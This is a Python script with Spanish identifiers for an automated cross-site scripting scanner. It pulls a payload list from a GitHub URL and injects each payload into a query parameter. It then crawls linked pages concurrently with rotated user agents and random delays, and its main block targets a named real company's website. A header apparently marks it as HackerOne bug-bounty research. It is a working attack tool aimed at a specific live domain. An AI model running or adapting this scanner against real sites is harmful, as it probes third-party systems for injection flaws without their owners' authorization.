import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin
import json
import time
import random
import logging
from concurrent.futures import ThreadPoolExecutor

logging.basicConfig(level=logging.INFO)

class ComprobadorXSS:
    def __init__(self, base_url, payloads=None, max_profundidad=3, max_workers=5):
        self.base_url = base_url
        self.payloads = payloads or []
        self.max_profundidad = max_profundidad
        self.resultados_positivos = []
        self.resultados_negativos = []
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        ]
        self.headers = {
            "User-Agent": random.choice(self.user_agents),
            "X-HackerOne-Research": "eltontito@wearehackerone.com"
        }
        self.executor = ThreadPoolExecutor(max_workers=max_workers)

    def comprobar_vulnerabilidades_xss(self, url=None, profundidad=0):
        if not url:
            url = self.base_url

        self.cargar_payloads_desde_archivo('https://raw.githubusercontent.com/xaldoxxx/BugHunter001/main/xss_payload.txt')

        futures = []
        for payload in self.payloads:
            url_modificada = self.modificar_url(url, payload)
            logging.info(f"Probando URL: {url_modificada}")
            futures.append(self.executor.submit(self.probar_payload, url_modificada, payload))

        for future in futures:
            future.result()

        if profundidad < self.max_profundidad:
            self.explorar_enlaces(url, profundidad + 1)

    def modificar_url(self, url, payload):
        parsed_url = urlparse(url)
        query = parsed_url.query
        if query:
            new_query = f"{query}&s={payload}"
        else:
            new_query = f"s={payload}"
        return parsed_url._replace(query=new_query).geturl()

    def probar_payload(self, url, payload):
        try:
            respuesta = self.obtener_respuesta_url(url)
            if self.es_vulnerable_xss(respuesta, payload):
                self.resultados_positivos.append({"url": url, "payload": payload, "vulnerable": True})
            else:
                self.resultados_negativos.append({"url": url, "payload": payload, "vulnerable": False})
            self.imprimir_elementos_html(respuesta)
        except Exception as e:
            logging.error(f"Error al conectar al servidor con payload: {payload} en la URL: {url}", e)
        time.sleep(random.uniform(1, 5))

    def obtener_respuesta_url(self, url):
        response = requests.get(url, headers=self.headers)
        response.raise_for_status()
        return response.text

    def es_vulnerable_xss(self, respuesta, payload):
        return payload in respuesta

    def imprimir_elementos_html(self, contenido_html):
        soup = BeautifulSoup(contenido_html, 'html.parser')
        for element in soup.find_all(['title', 'h1', 'h2', 'p']):
            logging.info(f"Elementos {element.name}: {element.get_text()}")

    def explorar_enlaces(self, url, profundidad):
        try:
            response = requests.get(url, headers=self.headers)
            soup = BeautifulSoup(response.text, 'html.parser')
            for link in soup.find_all('a', href=True):
                full_url = urljoin(url, link['href'])
                self.executor.submit(self.comprobar_vulnerabilidades_xss, full_url, profundidad)
        except Exception as e:
            logging.error(f"Error al conectar al servidor: {e}")

    def cargar_payloads_desde_archivo(self, url):
        try:
            response = requests.get(url)
            response.raise_for_status()
            self.payloads = response.text.splitlines()
        except Exception as e:
            logging.error(f"Error al cargar los payloads desde el archivo: {e}")
            self.payloads = []

    def guardar_resultados(self):
        self.guardar_resultados_en_archivo('resultados_positivos.json', self.resultados_positivos)
        self.guardar_resultados_en_archivo('resultados_negativos.json', self.resultados_negativos)

    def guardar_resultados_en_archivo(self, nombre_archivo, resultados):
        try:
            with open(nombre_archivo, 'w', encoding='utf-8') as f:
                json.dump(resultados, f, ensure_ascii=False, indent=2)
        except Exception as e:
            logging.error(f"Error al guardar los resultados en el archivo: {e}")

if __name__ == "__main__":
    url = "https://www.redoxengine.com/?s="
    comprobador_xss = ComprobadorXSS(url)
    comprobador_xss.comprobar_vulnerabilidades_xss()
    comprobador_xss.guardar_resultados()
